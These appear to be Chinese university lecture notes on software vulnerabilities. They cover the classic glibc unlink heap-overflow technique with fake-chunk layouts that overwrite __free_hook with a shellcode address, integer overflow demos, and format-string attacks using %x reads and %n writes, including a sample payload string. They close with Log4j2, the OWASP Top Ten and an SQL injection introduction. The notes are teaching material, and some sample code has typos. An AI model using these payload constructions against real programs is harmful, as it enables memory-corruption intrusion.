- [x] <span style="color:blue;">小于512字节</span>的<span style="color:blue;">空闲</span>内存块被认为是<span style="color:red;">小块</span>，由于内存块的大小一定大于等于16字节而且是8的倍数，这些小块的信息被存放在62个Bin链表中(索引：0~61)
  - 第1个Bin链表存放16字节大小内存块的信息；第2个链表存放24字节；第3个链表存放32字节的；
  - 以此类推，第62个Bin链表存放504字节大小的空闲块信息
  - 所有小块单个Bin链表所存放的块的<span style="color:blue;">大小都是一样的</span>
- [x] 所有<span style="color:blue;">大于等于512字节</span>的<span style="color:blue;">空闲块被认为是<span style="color:red;">大块，它们的信息存放在后66个Bin链表中，每个Bin链表存放了<span style="color:blue;">一定长度范围</span>的空闲块

#### Bin链表示意图

<p align="center">
  <img src="./img/Bin链表示意图.png"></img>
</p>

#### Bin链表的链接情况

<p align="center">
  <img src="./img/Bin链表的链接情况.png"></img>
</p>

#### 堆管理的系统调用

- [x] <kbd style="color:red;">malloc</kbd> 函数
  - 函数形式: void *malloc(long NumBytes)
  - 功能:该函数分配了NumBytes个字节,并返回了指向这块内存的指针。如果分配失败,则返回一个空指针(NULL)
  - 注意:<span style="color:blue;">返回的指针指向数据区,不是</span>指向真正的chunk<span style="color:blue;">头部</span>
- [x] <kbd style="color:red;">free</kbd> 函数
  - 函数形式: void free(void *FirstByte)
  - 功能:将之前用malloc分配的空间还给程序或者是操作系统,也就是释放了这块内存,让它重新得到自由
  - 注意:如果在free 过程中发现free的chunk<span style="color:blue;">前后有空闲的chunk</span>,则会<span style="color:blue;">触发unlink操作和堆块合并</span>, 合并后再加入bin链表

#### 链表单元的删除

- [x] Malloc的实现使用两个宏来完成对于Bin链表的插入和删除操作
- [x] 用于删除单元的unlink宏定义如下：

```c
#define unlink(P, BK, FD){  \\ 带参宏定义
  BK = P->bk;  \\ 说明：当替换列表一行写不下时，可以使用反斜线\作为续行符延续到下一行             
  FD = P->fd;                             
  FD->bk = BK;                          
  BK->fd = FD;
}
```

##### 删除操作图示

<p align="center">
  <img src="./img/删除操作图示.png"></img>
</p>

##### 目标

- [x] unlink宏有两个写内存的操作。fd被写到(chunk->bk + 8)中，而bk被写到(chunk->fd + 12)中
- [x] 如果能控制fd和bk这两个指针的值，就可以<span style="color:red;">将任意4个字节内容写到任意一个内存地址中</span>去！这正是所期望的
- [x] <span style="color:blue;">目标就是设法</span><span style="color:red;">控制fd和bk中的内容</span>，并按照期望<span style="color:red;">触发unlink宏操作</span>，改变程序执行流程
- [x] 首先必须清楚unlink宏的调用位置

##### unlink宏的调用位置

- [x] malloc()和free()的实现里面都使用到了unlink宏。触发malloc()里的unlink操作比较困难，所以先从free()说起

```c
void free(void_t *mem){
  ...
  if(chunk_is_mmappend(p)){ // 如果IS_MMAPPED位被设置
    munmap_chunk(p);
    return;
  }
  ...
  p = mem2chunk(mem);  // 将用户地址转换成内部地址: p = mem - 8
  ...
  chunk_free(ar_ptr, p);
}
```

##### chunk_free的执行流程

- [x] 如果下一块是top节点，则与之合并
- [x]如果上一块是空闲的，则与之合并
  ```c
  p = chunk_at_offset(p, -prevsz);
  unlink(p, bck, fwd); /* 从链表中删除上一个结点 */
  ...
  top=(ar_ptr) = p;//合并到top块
  ```
- [x] 如果下一块不是top节点
- [x] 如果上一块是空闲的，则与之合并
  ```c
  p = chunk_at_offset(p, -prevsz);
  unlink(p, bck, fwd); /* 从链表中删除上一个结点 */
  ```
- [x] 如果下一个块是空闲的，则与之合并
  ```c
  unlink(next, bck, fwd); /* 从链表中删除下一个结点 */
  ```
- [x] 如果前后两块都不是空闲的，则做一些设置工作，然后将当前块插入到空闲链表中;

##### 利用需满足的条件

- [x] 有3个地方调用了unlink.如果想要执行它们，需要满足下列条件：
  1. 当前块的IS_MMAPPED位必须被清零，否则不会执行chunk_free()
  2. <span style="color:blue;">上一个块</span>是个<span style="color:blue;">空闲块</span>(当前块size的PREV_INUSE位清零)<span style="color:red;">或者</span>
  3. <span style="color:blue;">下一个块</span>是个<span style="color:blue;">空闲块</span>(<span style="color:blue;">下下一个块</span>(p->next->next)size的PREV_INUSE位清零) 

##### 一个实例程序

```c
// heap_overflow.c
#include <stdlib.h>
int main (int argc, char *argv[]{
  char *buf, *buf1;
  buf = malloc(16); /* 分配两块16字节内存 */
  buf1 = malloc(16);
  if (argc > 1)
    memcpy(buf, argv[1], strlen(argv[1]));  /* 这里会发生溢出 */
  printf(""%#p [buf](%.2d):%s\n", buf, strlen(buf), buf);
  printf(""%#p [buf1](%.2d):%s\n", buf1, strlen(buf1), buf1);
  printf("From buf to buf1 : %d\n\n", buf1 - buf);
  printf("Before free buf\n");
  free(buf);  /* 释放buf */
  printf(""Before free buf1\n");
  free(buf1);  /* 释放buf1 */
  return 0;
} /* End of main */
```

### 弱点程序分析

- [x] <span style="color:blue;">弱点程序发生溢出时，可以覆盖下一个块的内部结构，但是并不能修改当前块的内部结构</span>，因此条件2是满足不了的。只能寄希望于条件3
- [x] 所谓下下一个块的地址其实是由下一个块的数据来推算出来的，既然可以<span style="color:blue;">完全控制下一个块的数据</span>，就可以让<span style="color:blue;">下下一个块的size的PREV_INUSE位为零</span>。这样程序就会认为下一个块是个空闲块了弱点程序分析

### 利用思路

- [x] 假设当前块为块1,下一个块为块2，下下一个块为块3，如下图所示：

<p align="center">
  <img src="./img/利用思路.png"></img>
</p>

- [x] 只要能够通过修改size2，使得next2next指向一个可以控制的地址；之后在这个地址伪造一个块3，使得此块的
size3的PREV_INUSE位置零即可；然后，在fd2处填入要覆盖的地址，例如函数返回地址，.dtors.GOT等等
- [x] Solar Designer建议可以使用<kbd>__free_hook()</kbd>的地址，这样<span style="color:blue;">再下一次调用free()时就会执行我们的代码</span>。在bk2处可以填入shellcode的地址

### 如何构造块？

- [x] 实际构造的时候块2的结构如下：
  ```c
  prev_size2 = 0x11223344  /* 可以使用任意值 */
  size2 = (next2next - next) /* 这个数值必须是4的倍数 */
  fd2 = __free_hook- 12 /* 将shellcode地址刚好覆盖到
  __free_hook地址处 */
  bk2= shellcode
  ```
- [x] 伪造的块3则要求很低，只需要让size3的最后一位为0即可：
  ```c
  prev_size3 = 0x11223344 /* 可以使用任意值 */ 
  size3 = 0xffffffff & ~PREV_INUSE  /* 这里的0xffffffff可以用任意非零值替换*/
  ```

### 伪造块的位置问题

- [x] 伪造的块3可以放在任意可能的位置，例如块2的前面或者后面
  - 如果块3放在块2的后面，由于size2是4个字节，因此如果距离比较小的话，那么size2是肯定要包含零字节的，这会<span style="color:blue;">中断数据拷贝</span>，因此距离必须足够远，以至于四个字节均不为零，堆栈段是一个不错的选择，通过设置环境变量等方法也可以准确的得到块3的地址
  - 如果将块3放到块2的前面，那么size2就是个<span style="color:blue;">负值</span>，通常是<span style="color:blue;">0xffffffxx</span>等等。这肯定满足size2不为零的要求，另外，这个距离也可以很精确的指定。因此决定采用这种方法

<!-- tabs:start -->

#### **第一种构造方法**


- [x] 在上面的图上，将块3的8字节的内部结构放在了块1的用户数据区中，而块3的用户数据区实际上是从块2开始的
- [x] 但是既然根本不关心块3的prev_size以及数据段，而块2的prev_size也不关心，因此还可以有更简化的版本：将块3往右移动4个字节，即让siez3与prev_size2重合

<p align="center">
  <img src="./img/第一种构造方法.png"></img>
</p>

#### **更精简的构造办法**

<p align="center">
  <img src="./img/第一种构造方法.png"></img>
</p>

- [x] 这样next2next - next = -4 = 0xfffffffc .则块2就可以重新构造一下：

```c
prev_size2 = 0x11223344 & ~PREV_INUSE;  /* 用原来的size3代替 */
size2 = 0xfffffffc; /* 长度为-4 */  
fd2 = __free_hook - 12; /*将shellcode地址刚好覆盖到__free_hook地址处*/
bk2 = shellcode;
```
<!-- tabs:end -->

### 堆溢出–小结

- [x] 要达到利用free()函数调用来攻击的目的，需要满足以下条件：
  1. 通过某些漏洞(例如堆溢出)来覆盖将要被free()的chunk
  2. 在被覆盖chunk的位置上构造fake_chunk
  3. fake_chunk要确保在free()函数调用过程中运行unlink宏
  4. unlink宏所操作的内存将修改程序的流程
- [x] 一般有两种方法：
  1. 如果想利用上一块的unlink进行攻击，需要保证:
    - chunk->size的IS_MMAPPED位为0
    - chunk->size的PREV_INUSE位为0
    - chunk + chunk->prev_size指向一个我们控制的伪造块结构
    - 在一个确定的位置构造一个伪块
  2. 如果想利用下一个块的unlink进行攻击，需要保证:
    - chunk->size的IS_MMAPPED位为0
    - chunk->size的PREV_INUSE位为1
    - chunk + nextsz 指向一个我们控制的伪造块结构。
      > - (nextsz = chunk->size & ~(PREV_INUSE|IS_MMAPPED))
    - 在一个确定的位置构造一个伪块

### 堆溢出–其他

- [x] 前一部分说的都是利用<span style="color:blue;">free()的unlink()宏</span>来改变程序流程的方法，其实在<span style="color:blue;">malloc()中也有unlink()宏</span>，所以如果程序写的有问题的话，照样可以被用来利用改变程序流程，例如著名的double-free漏洞利用
- [x] 新版堆管理算法ptmalloc2引入的fastbin机制客观上
增加了溢出攻击的难度。必须设法绕过fastbin机制
- [x] Heap Spray(堆喷射)
  - <span style="color:blue;">栈溢出和堆溢出相结合</span>的一种技术
  - 首先将shellcode放置到<span style="color:blue;">堆</span>中，然后在<span style="color:blue;">栈溢出</span>时，控制函数执行流程，跳转到堆中执行shellcode

## 整数溢出漏洞

### 整数溢出

```c
/* int.c */
#include <stdio.h>
int func(char *userdata , short datalength ){
  char  *buff;
  if(datalength != strlen(userdata)){
    printf("error in func\n");
    return -1;
  }
  datalength = datalength * 2;
  buff = malloc(datalength);
  strncpy( buff, userdata, datalength);

  printf("userdata: %s\n", userdata);
  printf("buff: %s\n", buff);

  return 0;
}

int main(int argc, char *argv[]){
  if(argc>1){
    func( argv[1], strlen(argv[1]) );
  }else{
    printf("error in main\n");
  }
}
```

> - <span style="color:blue;">长度值是短整型数的，其数据的取值范围在-32768 ~ 32767，datalength \*2后可能会超出16位short整型数所能表示的最大值，造成datalength \* 2 < datalength</span>

```term
$ gcc-g -o int int.c
int.c: In function `func':
int.c:12: warning: assignment makes pointer from integer without a cast
$ ./int aaaaaaaaaaaaaaaa
userdata: aaaaaaaaaaaaaaaa
buff: aaaaaaaaaaaaaaaa
$ ./int `perl-e 'print "A" x 16383'`
…
$ ./int `perl -e 'print "A" x 16384'`
Segmentation fault
```

- [x] 由于整数在内存里面保存在一个<span style="color:red;">固定长度</span>(例如使用32位)的空间内，它能存储的<span style="color:red;">最大值就是固定的</span>
- [x] <span style="color:red;">当尝试去存储一个数，而这个数又大于这个固定的最大值时，将会导致整数溢出</span>

```asm
num1 = 0xFFFFFFFF;        11111111 11111111 11111111 11111111
num2 = 0x00000001;        00000000 00000000 00000000 00000001  
num3 = num1 + num2;       00000000 00000000 00000000 00000000
```

```c
/* int_width_overflow.c */
#include <stdio.h>
int main(void){
  int l;
  short s;
  char c;
  l = 0xdeadbeef;
  s = l;
  c = l;
  printf("l = 0x%x (%d bits)\n", l, sizeof(l) * 8);
  printf("s = 0x%x (%d bits)\n", s, sizeof(s) * 8);
  printf("c = 0x%x (%d bits)\n", c, sizeof(c) * 8);
  return 0;
}
```

```term
$ gcc -g -o int_width_overflow int_width_overflow.c
$ ./int_width_overflow
1 = 0xdeadbeef(32 bits)
1 = 0xffffbeef(64 bits)
1 = 0xffffffef(8 bits)
```

```c
/* int_width_overflow2.c */
#include <stdio.h>
#include <string.h>
int main(int argc, char *argv[]){
  unsigned short s;
  int i;
  char buf[80];
  if(argc < 3){
    return -1;
  }
  i = atoi(argv[1]);
  s = i;
  if(s >= 80){       
    /* [w1] */
    printf("Oh no you don't!\n");
    return -1;
  }
  printf("s = %d\n", s);
  memcpy(buf, argv[2], i);
  buf[i] = '\0';
  printf("%s\n", buf);
  return 0;
```

- [x] <span style="color:blue;">unsigned short是2个字节，最大为65535</span>
- [x] <span style="color:blue;">int是4个字节</span>
- [x] <span style="color:blue;">输入的是65537=0x10001，被砍成1后顺利通过检查</span>
- [x] <span style="color:blue;">但memcpy实际长度参数为65537</span>

```term
$ gcc -g -o int_width_overflow2 int_width_overflow2.c
$ ./int_width_overflow2 65537 asdfg
s = 1
Segmentation fault
```

### 整数溢出的危害

- [x] 如果一个整数用来计算一些敏感数值，如 `缓冲区大小或数组索引` ，就会产生 `潜在的危险`
- [x] 不过，并不是所有的整数溢出都可以被利用，毕竟，整数溢出 `并没有改写额外的内存`
- [x] 但是，在有些情况下，整数溢出将会导致"不能确定的行为"，由于整数溢出出现之后，很难被立即察觉，比较难用一个有效的办法去判断是否出现或者可能出现整数溢出

## 格式化字符串漏洞

### 如何改写内存地址内容？

- [x] 利用栈溢出、堆溢出等都能实现改写内存地址内容
- [x] 还有其他方式，例如printf()语句：

```c
#include <stdio.h>

void function(int a, int b, int c)
{
  char buffer1[5];
  char buffer2[10];
  int *ret;
  ret = buffer1 + 12;
  // (*ret) += 8;   
  printf(…); //自己构造，使打印出0
}

int main()
{
  int x;
  x = 0;
  function(1,2,3);
  x = 1;
  printf("%d\n",x);
}
```

### 可变参数函数

- [x] printf()函数用于<span style="color:red;">按照某个格式输出</span>字符串
  - <kbd style="color:cyan;">int printf(“Hello, %s”, name);</kbd>
  - <kbd style="color:green;">int printf(“Hello, %s, %d \n”, name, i);</kbd>
  - <span style="color:red;">第一个参数</span>叫作<span style="color:red;">格式化字符串</span>(format string) ，用来定义输出的格式
  - 格式化字符串使用字符<span style="color:blue;">%标记的占位符</span>，printf()函数在打印过程中向占位符的位置填充数据
- [x] printf函数与其他函数有很大不同
  - 多数函数接收<span style="color:blue;">固定数目的参数</span>
  - printf函数可以接收<span style="color:blue;">任意数目(≥1)的参数</span>
- [x] 编译器检查
  - 如果一个函数的定义中有三个参数，但调用时只传递了两个参数，编译器将<span style="color:blue;">报错</span>
  - 无论给printf()函数传递多少个参数，编译器都认为<span style="color:blue;">合法</span>
- [x] printf()函数是通过一种特殊方式定义的：

```c
#include <stdio.h> 
int printf(const char *format, ...); 
int fprintf(FILE *stream, const char *format, ...); 
int sprintf(char *str, const char *format, ...); 
int snprintf(char *str, size_t size, const char *format, ...);
```
> - .<span style="color:red;">..可变参数</span>没有名字，printf()函数<span style="color:red;">如何访问</span>？

### 基础知识：VA_LIST

- [x] VA_LIST 是在C语言中<span style="color:red;">解决变参问题</span>的一组<span style="color:red;">宏</span>，所在头文件：#include <stdarg.h> ，用于获取<span style="color:red;">不确定个数的参数</span>

```c
va_list ap;       //声明一个变量来转换参数列表
va_start(ap,fmt); //初始化变量
va_arg(ap,type);  //取出参数
va_end(ap);       //结束变量列表,和va_start成对使用
```

### 如何使用可变参数

- [x] 编写一个简单的myprint()函数来演示printf()如何工作

```c
#include <stdio.h>
#include <stdarg.h>

int myprint(int Narg, ...){
  int i;
  va_list ap;  // 1

  va_start(ap, Narg);  // 2
  for (i = 0; i < Narg; i++){
    printf("%d ", va_arg(ap, int));  // 3
    printf("%f\n", va_arg(ap, double));  // 4
  }
  va_end(ap);  // 5
}

int main(){
  myprintf(1, 2, 3.5);
  myprintf(2, 2, 3.5, 3, 4.5);
  return 1;
}
```

- [x]  考虑myprintf()在被调用
  - 初始化va_list指针：
    - 第1行定义了一个va_list指针ap，用于访问可变参数
    - 第2行的宏va_start根据它的第二个参数Narg(即myprintf()函数的第一个参数)来计算va_list的起始位置(就是为什么myprintf()函数至少必须有一个固定参数)
    - 宏va_start()获得Narg的地址(设为A)，根据其类型(int)计算它的长度(设为B),然后设置va_list指针ap指向A+B，实际上就是指向Narg正上面的内存位置
  - 移动va_list指针：
    - 为了使用va_list访问可变参数，需要利用va_arg()宏，它需要两个参数：第一个是va_list指针，第二个是所访问可变参数的类型
    - va_arg()宏返回va_list指针指向的值，并使指针指向下一个可变参数的位置(第3行和第4行)例如：va_arg(ap, int) 把指针ap上移4个字节
  - 结束：
    - 当程序访问完所有可变参数时，调用va_end()宏(第5行)来做必要的清理工作

<p align="center">
  <img src="./img/栈帧的布局.png"></img>
</p>

- [x] 与myprintf()函数相比，printf()函数同样使用 `第一个参数(格式化字符串)` 来达到相同目的，但实现方式却完全不同

```c
#include <stdio.h>

int main(){
  int id = 100, age = 25;
  char *name = "Bob Smith";
  printf("ID: %d, Name: %s, Age: %d\n", id, name, age);
}
```

- [x] printf()函数含有三个可变参数。它的格式化字符串中有三个 `以%引导` 的元素( `格式规定符` ，format specifiers)
- [x] printf()函数扫描格式化字符串，打印出每个遇到的字符，直到 `遇到一个以%引导` 的格式规定符
- [x] printf()函数调用va_arg()来<span style="color:red;">获得当前va_list指针指向的可变参数</span>,同时va_arg()把指针移到下一个可变参数

<p align="center">
  <img src="./img/栈帧的布局1.png"></img>
</p>

- [x] 当printf()函数被调用时，参数以 `倒序` 压入栈中
- [x] 扫描并打印格式化字符串时，printf()函数用第一个可变参数(标记为①)替代第一个格式规定符(%d)，并输出它的值100
- [x] 接着va_list指针移动到②处

### 可变参数函数

```c
#include <stdarg.h> 
int vprintf(const char *format, va_list ap); 
int vfprintf(FILE *stream, const char *format, va_list ap); 
int vsprintf(char *str, const char *format, va_list ap); 
int vsnprintf(char *str, size_t size, const char *format, va_list ap);
```

- [x] 另外还有：
  - setproctitle, syslog, err*, verr*, warn*, vwarn*等

### 格式化字符串：constchar *format

- [x] format 参数是包含三种对象类型的字符串
  - <span style="color:red;">无格式字符</span>，复制到输出
  - <span style="color:red;">格式规定符(转换规范)</span>，每个规范导致在值参数列表中检索1 个或更多个项
  - <span style="color:red;">转义序列</span>，例如“\n”
- [x] 通常意义上format的 <span style="color:red;">格式规定符</span> 如下：
  - <kbd>%[flags][width][.prec][F|N|h|l]type</kbd>

#### <kbd>%[flags][width][.prec][F|N|h|l]type</kbd>

- [x] type 用于规定输出数据的 `类型`

<p align="center">
  <img src="./img/type用于规定输出数据的类型.png"></img>
</p>
<p align="center">
  <img src="./img/type用于规定输出数据的类型1.png"></img>
</p>

- [x] flags 规定输出 `样式`

<p align="center">
  <img src="./img/flags规定输出样式.png"></img>
</p>

- [x] width 用于控制 `显示数值的宽度`
- [x] n(n=1,2,3...)： 宽度至少为n位， <span style="color:red;">不够以空格填充</span>
- [x] 如果转换值字符少于字段宽度，该字段将<span style="color:red;">从左到右按指定的字段宽度填充</span>。如果指定了左边调整选项，字段将在右边填充
- [x] 如果转换结果宽于字段宽度，将扩展该字段以包含转换后的结果。不会发生截断。然而，小的精度可能导致在右边发生截断

- [x] prec 用于控制 `小数点后面的位数`
- [x] 无按缺省精度显示0
  - 当type=d,i,o,u,x时，没有影响；
  - type=e,E,f时，不显示小数点
- [x] n(n=1,2,3...)
  - 当type=e,E,f时表示的最大小数位数；
  - type=其他，表示显示的最大宽度

- [x] [F|N|h|l 表示指针是否是远指针或整数是否是长整数
  - F 远指针(32位，可指向内存中的任意目标)
  - N 近指针(16位，只表示段内的偏移地址)
  - h 短整数(short int)
  - l 长整数(long int) (此处如果与d搭配为%lld则为long long int(C99)，与f搭配为%llf则为long double(C99))

#### 转义序列/ 转义字符

- [x] 转义序列在字符串中会被自动转换为相应 `操作命令`

<p align="center">
  <img src="./img/转义序列.png"></img>
</p>

### 格式化字符串漏洞的大约情形

- [x] 错误用法:
  ```c
  int func (char *user){
    printf (user);
  }
  ```
- [x] 正确用法:
  ```c
  int func (char *user){
    printf ("%s", user);
  }
  ```

### 格式化字符串漏洞的类型

- [x] 用户提供部分格式化字符串，例如：
  ```c
  char tmpbuf[512];
  snprintf (tmpbuf, sizeof (tmpbuf), "foo: %s", user);
  tmpbuf[sizeof (tmpbuf) - 1] = ’\0’;
  syslog (LOG_NOTICE, tmpbuf);
  ```
- [x] 用户提供全部格式化字符串，例如：
  ```c
  int Error (char *fmt, ...);...
  int someotherfunc (char *user){  ...
    Error (user);  ...
  }
  ```

### 格式化字符串函数的压栈细节

- [x] 例: <kbd style="color:green;">printf ("Number %d has no address, number %d has: %08x\n", i, a, &a);</kbd>

<p align="center">
  <img src="./img/格式化字符串函数的压栈细节.png"></img>
</p>

### 如果参数数量不匹配会发生什么？

- [x] <kbd style="color:purple;">printf ("a has value %d, b has value %d, c is at address: %08x\n",a, b);</kbd>
- [x] 在上面的例子中格式字符串需要3个参数，但程序只提供了2个
- [x] <span style="color:red;">该程序能够通过编译么</span>？
  - printf()是一个参数长度可变函数。因此，仅仅看参数数量是看不出问题的
  - 为了查出不匹配，编译器需要了解printf()的运行机制，然而编译器通常不做这类分析
  - 有些时候，格式字符串并不是一个常量字符串，它在程序运行期间生成(比如用户输入)，因此，<span style="color:red;">编译器无法发现不匹配</span>
- [x] <span style="color:red;">printf()函数自身能检测到不匹配么</span>？
  - printf()从栈上取得参数，如果格式字符串需要3个参数，它会从栈上取3个，除非栈被标记了边界，<span style="color:blue;">printf()并不知道自己是否会用完提供的所有参数</span>
  - 既然没有那样的边界标记。printf()会<span style="color:blue;">持续从栈上抓取数据</span>，在一个参数数量不匹配的例子中，它<span style="color:blue;">会抓取到一些不属于该函数调用到的数据</span>
- [x] 如果有人特意准备数据让printf抓取会发生什么呢？

### 格式化字符串漏洞的危害

<!-- tabs:start -->

#### **攻击一：输出栈中的数据**

```term
$ cat print.c
#include "stdio.h"
void main(){
  printf ("%08x.%08x.%08x.%08x.%08x\n");
}
$ gcc-g -o print print.c
print.c: In function 'main':
print.c:3: warning: return type of 'main' is not 'int'
$ ./print 
4f17ee28.4f17ee38.00000000.5be952e0.5b937b70
```

#### **攻击二：使程序崩溃**

```term
$ cat print.c
#include "stdio.h"
void main()
{
  printf ("%s%s%s%s%s%s%s%s%s%s%s%s");
}
$ gcc-g -o print print.c
print.c: In function 'main':
print.c:3: warning: return type of 'main' is not 'int'
$ ./print 
段错误
```

#### **攻击三：访问任意位置内存**

- [x] 需要得到一段数据的内存地址，但我们无法修改代码，供我们使用的<span style="color:blue;">只有格式字符串</span>
- [x] 如果调用<span style="color:red;">printf("%s")</span>时没有指明内存地址, 那么目标地址就可以通过printf函数，在栈上的任意位置获取。printf函数维护一个初始栈指针,所以能够得到所有参数在栈中的位置
- [x] 观察: 格式字符串位于栈上。如果我们可以<span style="color:red;">把目标地址编码进格式字符串，那样目标地址也会存在于栈上</span>，在接下来的例子里，格式字符串将保存在栈上的缓冲区中

```c
int main(int argc, char *argv[])
{
  char user_input[100];
  ... ... /* other variable definitions and statements */
  scanf("%s", user_input); /* getting a string from user */
  printf(user_input); /* Vulnerable place */
  return 0;
}
```

- [x] 如果让printf函数得到格式字符串中的目标内存地址(该地址也存在于栈上), 我们就可以访问该地址
  ```c
  printf ("\x10\x01\x48\x08 %x %x %x %x %s");
  ```
- [x] `\x10\x01\x48\x08` 是目标地址的四个字节， 在C语言中, `\x10` 告诉编译器将一个16进制数0x10放于当前位置(占1字节)。如果去掉前缀\x10就相当于两个ascii字符1和0了，这就不是我们所期望的结果了
- [x] %x 导致栈指针向格式字符串的方向移动

<p align="center">
  <img src="./img/访问任意位置内存.png"></img>
</p>

- [x] 使用四个%x来移动printf函数的栈指针到存储格式字符串的位置，一旦到了目标位置，<span style="color:red;">使用％s来打印，它会打印位于地址0x10014808的内容</span>，因为是将其作为字符串来处理，所以会一直打印到结束符为止
- [x] <span style="color:blue;">user_input数组到传给printf函数参数的地址之间的栈空间不是为了printf函数准备的</span>。但是，因为程序本身存在格式字符串漏洞，所以<span style="color:blue;">printf会把这段内存当作传入的参数来匹配％x</span>
- [x] 最大的挑战就是想方设法找出<span style="color:blue;">printf函数栈指针(函数取参地址)到user_input数组的这一段</span><span style="color:red;">距离是多少</span>，这段距离决定了你需要在%s之前<span style="color:red;">输入多少个%x</span>

```term
$ cat print.c
#include "stdio.h"
void main()
{
  printf ("\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|"); // \x10\x01\x48\x08_%08为address
}
$ gcc-g -o print print.c
print.c: In function 'main':
print.c:3: warning: return type of 'main' is not 'int'
$ ./print 
_605501f8.60550208.00000000.4aac22e0.4a564b70|(null)|
```

#### **攻击四：改写任意位置内存**

- [x] 完全利用格式化字符串exploit
  - 幸好，存在一种格式化字符串<span style="color:blue;">%n</span>，可以用来攻击先前的那段代码
  - <span style="color:red;">%n用来向某个整数指针所指的整数变量里写入先前已经输出的字符数</span>，例如：
    ```c
    int i = 0;
    printf (“myUSTC%n\n", (int *) &i);
    printf ("i = %d\n", i);
    ```
   > - 将打印出“i= 6”
  - 如果要让i=10000怎么办？
    - %n之前写入10000个字符
    - 利用%10000d
- [x] 利用“%n”这个性质，可以向任何内存写入一个数
- [x] 例如：只要将上一小节的%s替换成%n就能够覆盖0x10014808的内容
  ```c
  printf ("\x10\x01\x48\x08 %x %x %x %x %n");
  ```
- [x] 利用%n可以做到
  - `重写` 栈或者函数等的 `返回地址`
  - `重写程序标识` 控制访问权限
- [x] 类似普通缓冲区覆盖函数返回地址
  - 例如：
    ```c
    char outbuf[512];
    char buffer[512];
    sprintf (buffer, "ERR Wrong command: %400s", user);
    sprintf (outbuf, buffer);
    ```
    > - 提供类似如下的格式化字符串：
    > - "%497d\x3c\xd3\xff\xbf<nops><shellcode>"
- [x] 更快的方法

<p align="center">
  <img src="./img/改写任意位置内存.png"></img>
</p>

<!-- tabs:end -->

# Web应用程序漏洞

## Web基础

- [x] 目前普遍使用的Web三层架构

<p align="center">
  <img src="./img/改写任意位置内存.png"></img>
</p>

- [x] 一次Web访问过程分析

<p align="center">
  <img src="./img/一次Web访问过程分析.png"></img>
</p>

- [x] 软件Web化
  - C/S(客户端/服务器端) → `B/S` (浏览器/服务器端)
  - 云计算：SaaS(软件即服务)
  - 浏览器即操作系统(例如ChromeOS)，浏览器即服务
- [x] Web技术发展
  - Web 1.0：信息共享(单向)
  - Web 2.0：信息共建(交互)
  - Web 3.0：知识传承(泛型数据库，即时性)
  - Web 4.0：知识分配(物联网和人工智能)
  - Web 5.0：虚拟社会。。。还有Web 6.0。。。
- [x] 移动应用APP/小程序/快应用：模糊C/S和B/S

### Web中间件

- `Apache httpd` ：模块化的服务器，跨平台，API扩展
- `Tomcat` ：是Sun的JSWDK(Java Server Web Development Kit)中Servlet的运行环境(servlet容器)，是Apache Jakarta软件组织的一个子项目。经过多年发展，Tomcat不仅是JSP和Servlet规范的标准实现，而且具备了很多商业Java Servlet容器的特性，并被一些企业用于商业用途
- `JBoss` ：是一个运行EJB的J2EE应用服务器，开放源代码。已经发展成为一个基于J2EE的Web操作系统(operating 
system for web)，体现了J2EE规范中最新的技术
- `WebLogic` ：企业级的应用服务器，支持EJB、集群以及ERP(企业资源计划)的连通性，Oracle公司出品
- `WebSphere` ：IBM公司一套典型的电子商务应用开发工具及运行环境

### Web应用漏洞——整体观

<p align="center">
  <img src="./img/Web应用漏洞.png"></img>
</p>

### Apache Log4j2远程代码执行漏洞

- [x] “2021年十大网络安全漏洞”之首：2021年12月9日，阿里云安全团队向apache报告，震撼业界
- [x] Apache Log4j2是一个基于Java的<span style="color:blue;">日志记录框架</span>，开源，在企业、运营技术(OT)、软件即服务(SaaS)和云服
务提供商(CSP) 环境中普遍使用
- [x] Log4j2组件在处理程序日志记录时存在JNDI注入缺陷，攻击者仅仅需要向目标服务器发送精心构造的恶意数据触发Log4j2组件解析缺陷，就<span style="color:blue;">可以实现目标服务器任意命令执行，获取目标服务器权限</span>
- [x] 由于日志记录存在的普遍性，所以该漏洞具有<span style="color:blue;">危害程度高、利用难度低、影响范围大、后续影响广</span>的特点
- [x] 漏洞涉及CVE编号：CVE-2021-44228

## OWASP Top Ten 2021

- [x] Top 10 Web Application Security Risks  https://owasp.org/Top10/
- [x] https://owasp.org/Top10/zh_CN/

### OWASP Top Ten 2021 VS. 2017

<p align="center">
  <img src="./img/OWASP2017.png"></img>
</p>

- [x] https://owasp.org/www-project-top-ten
- [x] 新增加
  - A04:2021-Insecure Design 不安全设计
  - A08:2021-Software and Data Integrity Failures 软件及资料完整性失效
  - A10:2021-Server-Side Request Forgery(SSRF) 服务器端请求伪造
- [x] 合并或删除
  - A04:2017-XML External Entities(XXE) XML外部实体
  - A07:2017-Cross-Site Scripting(XSS) 跨站脚本
  - A08:2017-Insecure Deserialization 不安全的反序列化

#### OWASP Top Ten 2017

<p align="center">
  <img src="./img/OWASP20171.png"></img>
  <img src="./img/OWASP20172.png"></img>
</p>

### Top 10应用程序安全风险因素

<p align="center">
  <img src="./img/10应用程序安全风险因素.png"></img>
</p>

## SQL注入漏洞

### 注入漏洞

- [x] <span style="color:red;">原理</span>：攻击者能够利用现有Web应用程序，<span style="color:blue;">将恶意代码当作数据插入查询语句或命令中</span>，这些恶意数据可以欺骗解析器，从而执行非授权操作
- [x] <span style="color:red;">可利用性</span>：注入攻击漏洞往往是应用程序<span style="color:blue;">缺少对输入进行安全性检查</span>所引起的。几乎任何数据源都能成为注入载体，包括环境变量、所有类型的用户、参数、外部和内部Web服务
- [x] <span style="color:red;">普遍性</span>：注入漏洞十分普遍，注入漏洞通常能在SQL查询、LDAP查询、OS命令、程序参数等中出现

### SQL注入漏洞

- [x] SQL注入漏洞是指，攻击者能够利用现有Web应用程序，<span style="color:blue;">将恶意的数据插入SQL查询中</span>，提交到后台数据库引擎<span style="color:blue;">执行非授权操作</span>
- [x] SQL注入漏洞的主要危害：
  - 非法<span style="color:blue;">查询、修改或删除</span>数据库资源
  - <span style="color:blue;">执行</span>系统命令
  - <span style="color:blue;">获取</span>承载主机操作系统和网络的访问权限
- [x] SQL注入漏洞的风险较大：
  - <span style="color:red;">具有广泛性</span>。所有基于SQL语言标准的<span style="color:blue;">数据库软件</span>(SQL Server/Oracle/MySQL/DB2等)以及与之连接的<span style="color:blue;">网络应用程序</span>(ASP/JSP/PHP/Perl等)都面临该类攻击
  - <span style="color:red;">防范较困难</span>。SQL注入内容是<span style="color:blue;">正常输入的一部分</span>，较易绕过防火墙

### SQL注入原理

- [x] 正常登陆

<p align="center">
  <img src="./img/SQL注入原理.png"></img>
</p>

